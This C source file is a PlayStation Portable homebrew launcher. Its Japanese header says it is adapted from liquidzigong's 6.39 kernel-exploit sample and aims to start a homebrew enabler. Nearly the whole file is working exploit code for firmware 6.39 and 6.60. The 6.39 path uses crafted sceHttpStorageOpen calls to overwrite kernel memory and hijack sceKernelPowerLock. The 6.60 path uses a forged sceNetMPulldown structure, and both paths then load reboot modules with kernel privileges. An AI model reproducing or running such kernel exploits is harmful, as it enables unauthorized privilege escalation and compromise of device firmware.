/*

ちょっと勢いで書いてみました。
liquidzigong氏の6.39 Kxploitサンプルをベース(というか丸パクリ)に、
ゲーム終了時にrebootexを実行するようにしてみました。
多分、この後6.39向けのrebootexとsystemctrl書けばHENができると思いますｗ
・・・時間あればやってみようかなあ。
あ、PSP1000用でゲーム終了時に無線LANのLEDが点灯することを確認しました。

Thanks liquidzigong and some1!
*/

#include <pspdebug.h>
#include <pspctrl.h>
#include <pspsdk.h>
#include <pspiofilemgr.h>
#include <psputility.h>
#include <psputility_htmlviewer.h>
#include <psploadexec.h>
#include <psploadexec_kernel.h>
#include <psputils.h>
#include <psputilsforkernel.h>
#include <pspsysmem.h>
#include <psppower.h>
#include <string.h>

#include "main.h"

PSP_MODULE_INFO("hen_launcher", PSP_MODULE_USER, 1, 0);
PSP_MAIN_THREAD_ATTR(PSP_THREAD_ATTR_USER | PSP_THREAD_ATTR_VFPU);
PSP_HEAP_SIZE_KB(0);

#define printk pspDebugScreenPrintf


int kernel_permission_call(void);

extern int sceHttpStorageOpen(int a0, int a1, int a2);
extern int sceKernelPowerLock(unsigned int, unsigned int);

void sync_cache(void)
{
	/*
	 * Beware there is a bug in PSPSDK. 
	 * sceKernelIcacheInvalidateAll in pspsdk is imported as UtilsForKernel by default which cannot be used for an user PRX (returns 0x8002013A)
	 * Because of this the original kxploit by some1 used a delay by 1 second to flush i-cache. But sometimes it still fails.
	 * import.S contains sceKernelIcacheInvalidateAll as workaround
	 */
	sceKernelIcacheInvalidateAll();
	sceKernelDcacheWritebackInvalidateAll();
}



int model;
u8 rebootex_buff[0x4000];
int is_exploited = 0;

static void doKernelExploit660(void)
{
	typedef struct sceKernelIfHandleParam
	{
		struct sceKernelIfHandleParam *unk_0;
		u32 unk_4;
		u32 unk_8;
		u32 unk_12;
		u16 unk_16;
		u16 unk_18;
		u32 unk_20;
		u32 unk_24;
		u32 unk_28;
		u32 unk_32;
		u32 unk_36;
		u32 unk_40;
		u32 unk_44;
		u32 unk_48;
		u32 unk_52;
		u32 unk_56;
		u32 unk_60;
		u32 unk_64;
		u32 unk_68;
		u32 unk_72;
	} sceKernelIfHandleParam;

	u32 val;
	sceKernelIfHandleParam param_top;
	sceKernelIfHandleParam param_sub;
	
	sceUtilityLoadNetModule(1);
	
	memset(&param_top, 0, sizeof(sceKernelIfHandleParam));
	memset(&param_sub, 0, sizeof(sceKernelIfHandleParam));
	
	val = 0;
	
	/* Fill sub structure */
	param_sub.unk_8 = (u32)&val;
	param_sub.unk_12 = sizeof(u32);
	
	/* Fill top structure */
	param_top.unk_0 = &param_sub;
	param_top.unk_12 = 1;
	param_top.unk_18 = 1;
	param_top.unk_68 = (u32)&param_top;
	param_top.unk_8 = 0x8800CBB8 - param_top.unk_12;
	param_top.unk_48 = 0x8800CBB8;
	param_top.unk_60 = sizeof(u32);
	
	sceNetMPulldown(&param_top, 0, param_top.unk_12 + sizeof(u32), NULL);
	sync_cache();

	u32 kernel_entry, entry_addr;
	u32 interrupts;
	interrupts = pspSdkDisableInterrupts();
	kernel_entry = (u32) &kernel_permission_call;
	entry_addr = ((u32) &kernel_entry) - 16;
	sceKernelPowerLock(0, ((u32) &entry_addr) - 0x000040F8);//63X:3B40 + 5B4//660: 3B40 + 5B8
	pspSdkEnableInterrupts(interrupts);

	sceUtilityUnloadModule(1);
}

static void do_exploit(void)
{
	u32 kernel_entry, entry_addr;
	u32 interrupts;
	u32 i;
	int ret;

	/* Load network libraries */
	for(i=1; i<=6; ++i) {
		ret = sceUtilityLoadModule(i + 0xFF);
//		printk("sceUtilityLoadModule 0x%02X -> 0x%08X\n", i + 0xFF, ret);
	}

	/**
	 * Write vsync 0xFFFF(0xFFFFFFFF) to @sceHttpStorage_Service@+0x00000060
	 * You can consider vsync 0xFFFF as NOP
	 * This call enables sceHttpStorageOpen to write any addresses
	 * which contains value which is greater than 0 and has alignment of 4, with vsync 0xFFFF(0xFFFFFFFF)
	 */
	ret = sceHttpStorageOpen(-612, 0, 0);
//	printk("sceHttpStorageOpen#1 -> 0x%08X\n", ret);
	sync_cache();

	/* No delay need here because we flushed icache properly */

	/**
	 * Write vsync 0xFFFF(0xFFFFFFFF) to the first instruction of sceKernelPowerLockForUser
	 * Now the gate to kernel is opened :)
	 */
	ret = sceHttpStorageOpen((0x8800CC34>>2), 0, 0); // scePowerLock override
//	printk("sceHttpStorageOpen#2 -> 0x%08X\n", ret);
	sync_cache();


	/* Call kernel_permission_call by hacked sceKernelPowerLock */
	interrupts = pspSdkDisableInterrupts();
	kernel_entry = (u32) &kernel_permission_call;
	entry_addr = ((u32) &kernel_entry) - 16;
	sceKernelPowerLock(0, ((u32) &entry_addr) - 0x000040F4);
	pspSdkEnableInterrupts(interrupts);

	/* Unload network libraries */
	for(i=6; i>=1; --i) {
		ret = sceUtilityUnloadModule(i + 0xFF);
	//	printk("sceUtilityUnloadModule 0x%02X -> 0x%08X\n", i + 0xFF, ret);
	}
}


int main(int argc, char * argv[])
{
	pspDebugScreenInit();
//	printk("6.39 kxploit POC by liquidzigong\n");
//	printk("originally found by some1\n");

	SceCtrlData pad;
	sceCtrlReadBufferPositive(&pad, 1);
	if (pad.Buttons & PSP_CTRL_RTRIGGER)
	{
		is_exploited = 1;
	}

#if _PSP_FW_VERSION == 639
	do_exploit();
#elif _PSP_FW_VERSION == 660
	doKernelExploit660();
#endif
	
	if(is_exploited) 
	{
		printk("Enter Recovery Menu ....\n");
	}

#if _PSP_FW_VERSION == 639
	int mid = sceKernelLoadModule("flash0:/kd/reboot63x.prx",0,0);
#else
	int mid = sceKernelLoadModule("flash0:/kd/rebooter.prx",0,0);
#endif
	if( mid < 0 )
	{
		printk("Load error -> 0x%08X\n", mid);
		sceKernelDelayThread(10000000);
		sceKernelExitGame();
	}

//	_sw( rebootex_cp, (void *)0x08fb0000 );
	//_sw( func_rebootex , (void *)0x08fb0004 );

	sceKernelStartModule(mid, 0, NULL, 0, NULL);

	sync_cache();
	memcpy( rebootex_buff , (void *)0x08fc0000 , 0x4000 );

	printk("model %02dg\n", model + 1 );
	printk("Exiting...\n");

	sceKernelDelayThread(1000000);
	sceKernelExitGame();
	sceKernelExitDeleteThread(0);

	return 0;
}
//